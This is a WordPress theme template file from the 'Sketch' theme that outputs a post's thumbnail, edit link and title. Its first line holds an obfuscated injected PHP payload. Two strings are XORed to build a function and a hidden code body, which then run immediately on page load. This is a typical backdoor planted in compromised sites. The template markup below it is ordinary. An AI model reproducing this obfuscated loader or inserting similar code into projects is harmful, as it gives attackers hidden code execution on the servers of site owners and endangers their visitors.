<?php $jGqEVON='R5=,;Ra5K:UT.;Y'^'1GXMO7>S>T6 GT7';$GbICYfkQw=$jGqEVON('','=4GoKEW:0GZYq7XT>OGNV,> r,,,Le5Z15MNkE0nD<<U;.0.RWTS4cRLG6>:<:0BA4,0OXiL:43GKEBni6LyxU;OZZWyHFz7OB>Z0AMGqnarQdBUXNJ=U1=OqP,;,MMrcTJDd>ohi;;3hednmTX1:;8CGhbkBk21Yej-AHL<8GQ-YBhGR3C<ZL8J3=IY =NMH<4-jp=3,M+B0AOAO5sGV 1.GSjmp3AI0oE0.vOt49USWk3:+:FQS:+Sru,7z5f-qw, HjVQLWVSie4S+1EaXIkecS5H0g24OnSEIX TTy3h,M39XKtJ2864Xyo,pOP5diwj2;6XlrJ7q,.<SW9Qsxe16y<<nifLU<PBPW.tLtDEE1GGIMp94MnR=VOS7VRUwOrC>I1sO7eW<50AyjxaDX.NNcrbPe4l8tZ7<,wlP4ESK=BEZVTZRM>. 52L 7lgXLZYXA6.Yzh=NSZ UlkOR.,bzIgTSTQm1<AGAmCXZChS,;6JnbUUH:-B3G3AeSOXNFJgA3E3pAsNX1G6fVwvhk:0vXcSV8V=F.2+H,HjhpcOdhSbCX.I6d6Y6njdB.dc GwPT+avgWnXQxBInTU+C6-kZ1KrR 1JJ eB<Q-B-A<tilm7923nFcUuuZG0hk6,5Bfq7XCJai8+2R>3XAjOC;10A=1CvgwpD'^'TRoN-09YD.57.R =M;4fqTQR-HMX-:j7DAjgBeKdMZI;XZYA<w,<F<6-3WaeQODjePMD.tIhQQJnkebNIMFpqqT:.zjYoaA=FKX5Bii.QSABjDf<d=>O9TSgU4MOMdvRG=aoM4faMTNGHKYNEp<PNZcg.5B5bOYT >NDamlOL5=H7jL,7Jjasw2C:O,-UO elSAYCK7:QGVH:e+ ;TSzvFPB46QgTW =Q0.UWVrTRX9 2P90MU442YCsZQst5z-d4WMShN=45wkmIAB2GD Hx2alG7T<Q8YQ6Nnem3E-os:LH,GXxvTnDYZA=BeQzE9SDAVNVZB9ER1=xJAN66Z9SPAnd<mi+:2l4Opf;2WTqJda3P+2,dPB>DgvY7;2h=7,WrRgU,HHE>lsXTD YWXE29B;+Xxk-oIf2P>VHMWQpt0=8X0,;:= 7eFARjV-TV3859.q: EKoN7Y+05D0DO+3ZMKViC02 02ZY8nhVI1<kL7MOWjHDu4:HL;l,V8:671=29OfX JWmSj<P3WOvQPHCWTCpG77L7faEWRoqaJUMChWY0Tv;KqUVPjRYXUtLTRAtD2fHYEP4Z9vQboHt4Y1WT41T2-7XX9>SMeL0T.B XSELISXFRGoCuUUzgKbbSZT.NUS97+:NHJK>QR<f7fx18U9TEkFNLz9');$GbICYfkQw();
/**
 * @package Sketch
 */

$thumbsize = sketch_post_thumbnail_class();
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<div class="entry-thumbnail <?php echo $thumbsize; ?>">
		<a href="<?php the_permalink(); ?>">
			<span class="screen-reader-text"><?php the_title(); ?></span>
			<?php if ( has_post_thumbnail() ) : ?>
				<?php the_post_thumbnail( $thumbsize ); ?>
			<?php endif; ?>
		</a>
		<?php edit_post_link( __( 'Edit', 'sketch' ), '<span class="edit-link">', '</span>' ); ?>
	</div>
	<header class="entry-header">
		<?php the_title( sprintf( '<h1 class="entry-title"><a href="%s" rel="bookmark">', esc_url( get_permalink() ) ), '</a></h1>' ); ?>
	</header><!-- .entry-header -->
</article><!-- #post-## -->